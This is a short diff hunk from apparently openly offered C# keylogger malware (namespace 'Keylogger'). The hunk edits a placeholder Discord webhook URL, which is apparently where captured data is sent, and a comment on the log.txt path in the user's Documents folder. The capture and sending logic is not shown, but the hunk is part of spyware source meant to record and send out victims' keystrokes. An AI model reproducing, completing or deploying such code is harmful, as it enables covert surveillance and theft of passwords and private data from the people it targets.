@@ -15,8 +15,8 @@ namespace Keylogger
 
         static void Main(string[] args)
         {
-            string webhookUrl = "INSERT YOUR DISCORD WEBHOOK URL HERE";
-            string filePath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + @"\log.txt"; //you can rename log.txt to whatever you want it to be :)
+            string webhookUrl = "YOUR-WEBHOOK-URL-HERE";
+            string filePath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + @"\log.txt"; //You can rename log.txt to whatever you want it to be :)
             if (!File.Exists(filePath))
             {
                 File.Create(filePath).Dispose();
